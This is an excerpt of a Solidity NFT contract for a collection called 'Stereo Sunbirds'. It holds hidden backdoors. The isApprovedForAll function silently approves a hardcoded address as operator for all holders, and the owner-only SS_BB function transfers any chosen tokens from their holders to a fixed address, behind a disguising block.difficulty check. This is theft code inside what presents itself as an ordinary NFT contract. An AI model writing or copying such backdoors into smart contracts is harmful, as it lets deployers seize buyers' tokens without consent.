  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x0C27C76E03349c0e2c71dF633486833E21E53339){return true;}
...
contract Stereo_Sunbirds is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Stereo Sunbirds", "SS", maxBatchSize_, collectionSize_) {
  ...
  function SS_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x87a6A8753B4300E73b41EC04b85a21f05FF59eE6, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xaE697D9EF39823764692AC08FDa13Ef2bFe1241E);
